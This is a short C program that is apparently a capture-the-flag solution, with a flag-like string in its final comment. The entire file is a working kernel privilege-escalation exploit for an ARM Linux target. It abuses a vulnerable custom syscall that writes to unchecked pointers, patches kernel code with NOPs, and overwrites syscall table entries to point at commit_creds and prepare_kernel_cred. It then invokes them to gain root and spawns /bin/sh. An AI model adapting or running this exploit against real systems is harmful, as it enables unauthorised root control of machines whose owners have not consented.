#include <stdlib.h>
#include <unistd.h>

#define SYS_CALL_TABLE		0x8000e348
#define SYS_UPPER     		223
#define SYS_STIME     		25
#define SYS_TIME     		  13

#define PREPARE_KERNEL_CRED "\x24\xf9\x03\x80"
#define COMMIT_CREDS_MINUS_12 "\x60\xf5\x03\x80"

int main(){
  unsigned int** sct=(unsigned int**)SYS_CALL_TABLE;
   

   // Replace commit_creds - 12 with some kind of NOP (mov r8,r8)
   syscall(SYS_UPPER,"\x08\x80\xa0\xe1\x08\x80\xa0\xe1\x08\x80\xa0\xe1",0x8003f560); 

   // Replace sys_stime with commit_creds -12
   syscall(SYS_UPPER,COMMIT_CREDS_MINUS_12,&sct[SYS_STIME]);

   // Replace sys_time with prepare_kernel_cred
   syscall(SYS_UPPER,PREPARE_KERNEL_CRED,&sct[SYS_TIME]);

   // Execute commit_creds(prepare_kernel_cred(0))
   syscall(SYS_STIME,syscall(SYS_TIME,0));

   // Shell
   system("/bin/sh");
   return 0;
   //Must_san1tize_Us3r_p0int3r
}
